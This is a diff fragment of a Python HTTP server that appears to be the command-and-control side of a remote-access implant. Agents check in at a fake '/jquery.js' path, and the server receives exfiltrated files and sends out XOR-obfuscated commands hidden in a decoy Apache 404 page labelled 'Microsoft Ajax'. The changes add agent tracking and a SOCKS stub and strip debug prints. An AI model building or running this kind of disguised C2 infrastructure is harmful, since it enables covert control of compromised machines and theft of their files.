@@ -12,8 +12,15 @@ import subprocess
 import time
 from datetime import datetime
 
+global listAllAgents
+listAllAgents = []
+
+class SocksCheck():
+  portscan = ""
+  socksdata = ""
+
 class MultiThreading(ThreadingMixIn, HTTPServer):
-    pass
+  pass
 
 class Server(BaseHTTPRequestHandler):
 
@@ -41,6 +48,7 @@ class Server(BaseHTTPRequestHandler):
        agent_name = decrypted_results[0:12]
        if self.path =='/jquery.js':
             print("Agent " + agent_name + " Arrived!\n")
+            listAllAgents.append(decrypted_results)
        elif "DownloadingFileRand1me3" in data_results:
             os.chdir(os.path.dirname(__file__))
             if not os.path.exists(AgentFolder + '/Downloads'):
@@ -49,9 +57,7 @@ class Server(BaseHTTPRequestHandler):
             tempFile = "ignoremeFile.txt"
             # https://stackoverflow.com/questions/22216076/unicodedecodeerror-utf8-codec-cant-decode-byte-0xa5-in-position-0-invalid-s
             fullPath = AgentFolder + '/Downloads/' + tempFile
-            print(fullPath)
             orgFile = AgentFolder + '/Downloads/' + split_data[1]
-            print(orgFile)
             try:
                with open(fullPath, 'w') as out_file:
                   out_file.write(split_data[2])
@@ -96,7 +102,7 @@ class Server(BaseHTTPRequestHandler):
       self.end_headers()
       xorkey = 'j' * len(send_command.send_cmd)
       encrypt_cmd = encrypt.Encryption.xor_crypt_string(self, send_command.send_cmd, xorkey, True, False)
-      # statement to for agent isolation. Compare agent name from GET URL Path with the interact agentname
+      # statement for agent isolation. Compare agent name from GET URL Path with the interact agentname
       if agent_iso_class.unique_agent_name == decrypt_agentname:
           response = "<html>\n<head>\n<title>Microsoft Ajax</title>\n</head>\n<body>\n<h1>Not Found</h1>The requested URL /jquery.js was not found on this server.<hr/>\n<i>Apache/2.4.25 (NetWare) Server at localhost Port 80 </i>\n<br/><pre style='visibility:hidden;' id='wrapper'>\nMSAjax" + encrypt_cmd + '\n</pre>\n</body>\n</html>\n'
           # Clean Previous Tasks
